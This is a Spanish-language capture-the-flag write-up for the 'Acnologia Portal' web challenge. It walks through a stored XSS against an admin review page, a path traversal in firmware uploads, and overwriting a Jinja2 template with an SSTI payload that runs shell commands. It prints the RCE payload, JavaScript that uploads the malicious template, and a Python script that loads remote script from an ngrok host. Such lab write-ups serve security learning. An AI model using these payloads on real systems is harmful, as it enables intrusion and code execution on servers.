## Summary

Acnologia Portal es uno de los retos de difucultad media de el CTF. Fue la primera que intente ya que empece algo tarde por la hora de inicio y nadie aun la habia hecho asi que pense que podria ser la first blood (obviamente no lo fui 😢)

La descripcion de la maquina dice:

*Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?*

## Setup

Al descargar el archivo `.zip` y descomprimirlo podemos ver el codigo, esta maquina corre Flask un microframework para hacer servidores http.

## Buscar la flag

Lo primero que hice al descomprimir el archivo fue ver el archivo `Dockerfile`🐳 para ver donde estaria la flag
```Dockerfile
FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache supervisor chromium chromium-chromedriver gcc musl-dev libffi-dev

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install selenium Flask Flask-Session Flask-SQLAlchemy SQLAlchemy-serializer Flask-Login

# Copy flag
COPY flag.txt /flag.txt

# add user
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .
RUN chown -R www: /app

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

Como podemos ver en la linea `COPY flag.txt /flag.txt` la flag esta en un `.txt` en la carpeta base del servido asi que supose que el reto seria un LFI o un RCE.

## Setup Inicial 

La pagina nos deja hacer pocas cosas pero las suficientes:

- Crear un nuevo usuario
- Loggearnos con un usuario
- Crear una review

Al iniciar la instancia de docker 🐳 vemos un formulario para loggearnos al servidor 

![alt img](./img/Screenshot%202022-05-19%20185704.png)

Ademas de eso podemos ver en la parte de abajo que podemos crear un usuario y loggearnos con el nuevo usuario. Al hacer esto vemos 

## Explorando la pagina web 🗺️

Creando un usuario y loggearnos con este mismo vemos que la pagina tiene una lista de firwares y nos deja escribir una review de estos.

![alt img](./img/Screenshot%202022-05-19%20185903.png)

Al escribir una review se envia una peticion a este endpoint

```python
@api.route('/firmware/report', methods=['POST'])
@login_required
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    module_id = data.get('module_id', '')
    issue = data.get('issue', '')

    if not module_id or not issue:
        return response('Missing required parameters!'), 401

    new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
    db.session.add(new_report)
    db.session.commit()

    visit_report()
    migrate_db()

    return response('Issue reported successfully!')
```

Lo interensante del endpoint es la funcion `visit_report()` la cual simula que el administrador de la pagina se loggea a el servidor y revisa la review que acabamos de hacer. Para revisar la review el administrador visita el endpoint `/review` el cual renderiza este html.

```html
{% for report in reports %} 
    <div class="card">
        <div class="card-header"> Reported by : {{ report.reported_by }} </div>
        <div class="card-body">
            <p class="card-title">Module ID : {{ report.module_id }}</p>
            <p class="card-text">Issue : {{ report.issue | safe }} </p>
            <a href="#" class="btn btn-primary">Reply</a>
            <a href="#" class="btn btn-danger">Delete</a>
        </div>
    </div> 
{% endfor %} 
```

Lo destacable de esta parte es que 
```html
<p class="card-text">Issue : {{ report.issue | safe }} </p>
```
contiene la flag `safe` la cual le dice a jinja2 que no se preocupe y si encuentra algun tag de html que lo despliege sin problema lo cual nos permite hacer un xxs si el input no esta sanitizado el cual es nuestro caso. 

Mi idea inicial era robar la cookie del administrador y usarla mas adelante pero el servidor usa 

```python
from flask_session import Session
```

la cual crea cookies con la flag de `httpOnly` por ende no podriamos acceder a ella con javascript ademas de que el decorador que verifica que si las request vienen de un admin verifica que probengan de `127.0.0.1`

```python
def is_admin(f):
    @functools.wraps(f)
    def wrap(*args, **kwargs):
        if current_user.username == current_app.config['ADMIN_USERNAME'] and request.remote_addr == '127.0.0.1':
            return f(*args, **kwargs)
        else:
            return abort(405)
    return wrap
```

Entonces de momento tenemos un Blind XXS 👨‍🦯. 🎉🪅

## Escalando el XXS

Bueno con este XXS podemos acceder a los endpoints que que son para los administradores los cuales son 2 

- `/review`
- `/firmware/upload`

Este ultimo es interesante.

```python
@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403
```

Este endpoint nos deja subir un nuevo firware al servidor y este lo extrae y lo guarda usando la funcion `extract_firmware()`.

```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path) # Guarda el archivo en /tmp

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

Lo que me llama la atencion aca es que el archivo se guarda en `/tmp` antes de verificar si este es un archivo valido ademas de esto si no se filtra el nombre el archivo asi que tal vez podriamos agregar `../` a este y guardalo donde queramos.

## Probando subir archivos.

Bueno tenemos una forma de subir archivos probamos agregando `../` a los archivos pero claro para eso tendriamos que ser administradores, asi que le saque los decoradores de `is_admin` a los endpoints y reinicie la instancia de docker para tener un debug mas comodo. 

Teniendo eso listo creo una peticion para subir un archivo al servidor (Esto me tomo aprox 30 minutos en hacer) y la llevo al repeter de Burp y llegamos a algo asi:
```http
POST /api/firmware/upload HTTP/1.1
Host: localhost:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuFx8NnmI39xF4zPV
------WebKitFormBoundaryuFx8NnmI39xF4zPV
Content-Disposition: form-data; name="file"; filename="../app/test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryuFx8NnmI39xF4zPV--
```

Si todo lo anterior esta correcto significa que se crearia un archivo llamado `test.txt` en la carpeta `/app`.

![alt img](./img/Screenshot%202022-05-19%20191920.png)

Y efectivamente el archivo se sube correctamente aunque no se un archivo `.tar.gz` con esto empiezo a jugar con los nombres de los archivos y guardar el archivo en en la carpeta.

Aca es donde me estanco unos minutos pensando. Como puedo escalar esto a un RCE o LFI, bueno sabiendo que si el compre del archivo es el mismo que uno ya existente el archivo se sobrescribiria pense tal vez sobrescribir algun archivo `.py`, pero el problema de esto es que el servidor no tiene el modo `debug` activado entonces aunque cambie los archivos `.py` el codigo original seguira en la memora del interprete.

## RCE con HTML 🤔

Despues de perder 10 minutos pensando se me ocurrio la idea de sobre escribir un archivo `HTML` y con la sintaxis de `Jinja2` poder ejecutar codigo. Esto deberia funcionar, asi que escribo un archivo `.html` con un payload tipico de vulnerabilidades `SSTI`

```html
<h1> {{ 7*7 }} </h1>
```

Si subo este archivo y sobre escribe por ejemplo el archivo `register.html` cuando acceda al endpoint `/register` deberia mostrarme un 49. 

Asi que edito la request de Burp a esto y la envio.

```HTTP
POST /api/firmware/upload HTTP/1.1
Host: localhost:1337
Content-Length: 193
boundary=----WebKitFormBoundaryuFx8NnmI39xF4zPV
------WebKitFormBoundaryuFx8NnmI39xF4zPV
Content-Disposition: form-data; name="file"; filename="../app/application/templates/register.html"
Content-Type: text/plain

<h1> {{ 7*7 }} </h1>

------WebKitFormBoundaryuFx8NnmI39xF4zPV--
```

Verifico que el archivo se editara corractamente.

![alt img](./img/Screenshot%202022-05-19%20193027.png)

Viendo que todo salio como lo pense abro un navegador y reviso la pagina y me encuentro con eso.

![alt img](./img/Screenshot%202022-05-19%20193216.png)

🤔🤔🤔🤔🤔🤔

PERO QUE PASO. Si el archivo ya no tiene el codigo html original. Como paso esto?

Por suerte uso mucho flask y se que cuando flask habre un archivo `.html` para enviarlo este se guarda en el cache para no tener que abrirlo de nuevo una y otra vez asi que simplemente tendria que reiniciar el servidor subir el archivo y cuando este este sobrescrito con el payload ir al endpoint y ver el `49`.

![alt img](./img/Screenshot%202022-05-19%20171406.png)

🎉 RCE 🎉 Con esto tenemos un RCE funcional.

El problema de esto es que ahora tenemos que registrarnos a la pagina sin ir a `/register` asi que habra que escribir un script que use la api de la aplicacion, suba el xxs y este rescriba el archivo.

## Exploit 😎🧨

Para el exploit necesitamos 2 cosas
- Un payload para leer un archivo
- Un xxs que nos deje subir un archivo como admin
- Un script que use la api para enviar el xxs

Lo primero que hago (robo de PayloadAllTheThing) es el payload para leer archivos desde Jinja2
```HTML
<h1> 
    {{ namespace.__init__.__globals__.os.popen('cat ../../../../../../flag.txt').read() }} 
</h1>
```

Despues robo otro codigo para subir archivos con js de stackoverflow 
```js
const payload = "<h1> {{ namespace.__init__.__globals__.os.popen('cat ../../../../../../flag.txt').read() }} </h1>";

var strblob =new Blob([payload], {type: 'text/plain'});
var formdata = new FormData();
formdata.append("file", strblob, "../app/application/templates/register.html");

var requestOptions = {
    method: 'POST',
    body: formdata,
    redirect: 'follow'
};

fetch("http://localhost:1337/api/firmware/upload", requestOptions)
```

Y por ultimo programo un script para enviar todo al servidor.

```python
import requests

url = "http://localhost:1337/"

# Auth
r = requests.post(url +  "api/register", json = {"username": "frijolito", "password": "password"})
r = requests.post(url +  "api/login", json = {"username": "frijolito",  "password": "password"})

cookie = r.cookies["session"]

# Send the xxs
r = requests.post(
    url + "api/firmware/report",
    cookies = {"session": cookie},
    json = {
        "module_id": "1",
        "issue": "<script src='https://7698-181-226-248-235.sa.ngrok.io/content/fetch.js'></script>"
    }
)

# get the flag
r = requests.get(url + "register")
print(r.text)
```

Con todo esto listo uso `python3 -m http.server` para enviar el archivo xxs y ademas hago tunneling con ngrok para recibir las peticiones sin abrir los puertos.

Con el servidor reiniciado ejecuto el exploit.

![alt img](./img/Screenshot%202022-05-19%20194923.png)

Y FUNCIONA 🎉🎉 Con esto solo cambio la url de mi script y lo uso en el servidor oficial y obtengo la flag: `HTB{des3r1aliz3_4ll_th3_th1ngs}`.

Pero al learla y dice algo sobre deserializar lo que se me hace extraño. Al parecer esta no era la forma pensada de resolver el reto pero bueno funciona 🤷‍♂️.